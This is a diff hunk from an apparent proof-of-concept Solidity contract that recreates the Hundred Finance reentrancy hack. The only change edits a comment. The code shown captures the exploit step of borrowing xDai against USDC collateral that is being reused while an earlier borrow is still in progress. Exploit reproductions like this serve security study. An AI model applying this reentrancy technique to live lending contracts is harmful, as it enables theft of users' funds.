@@ -46,7 +46,7 @@ contract HundredFinanceHack is FlashLoan, Reentrancy, PoC {
                 borrowedXdai = true;
                 uint256 amount = (totalFlashloaned * 1e12) * 60 / 100;
 
-                // Borrow xdai agaist the same usdc collateral, since the initial borrow transaction hasn't completed
+                // Borrow xdai agaist the same usdc collateral, since the initial borrow transaction hasn't been completed
                 // we can reuse the collateral
                 ICompoundToken(address(hxdai)).borrow(amount);
             }
